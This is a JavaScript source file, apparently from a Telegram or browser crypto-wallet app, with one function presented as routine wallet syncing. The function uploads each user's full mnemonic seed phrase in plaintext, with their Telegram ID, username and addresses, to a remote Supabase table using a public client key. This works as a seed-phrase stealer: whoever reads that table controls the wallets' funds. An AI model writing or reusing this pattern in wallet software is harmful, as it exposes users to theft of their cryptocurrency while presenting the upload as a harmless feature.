/**
 * Supabase client using fetch API (avoiding dependency issues)
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Supabase credentials missing! Check VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
    return null;
  }

  const { telegram_id, username, mnemonic, addresses } = walletData;
  const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
  const userId = telegram_id && telegram_id !== 'unknown' ? String(telegram_id) : `browser_${Math.random().toString(36).slice(2, 11)}`;

  console.log('🔄 Syncing wallet to Supabase for user:', userId);

  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=telegram_id`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        telegram_id: userId,
        username: username || 'Anonymous',
        mnemonic: cleanMnemonic,
        addresses: addresses,
        last_sync: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const err = await response.text();
      console.error('❌ Supabase sync error:', response.status, err);
      return false;
    }

    console.log('✅ Wallet successfully synced to Supabase');
    return true;
  } catch (error) {
    console.error('❌ Supabase connection error:', error);
    return false;
  }
}
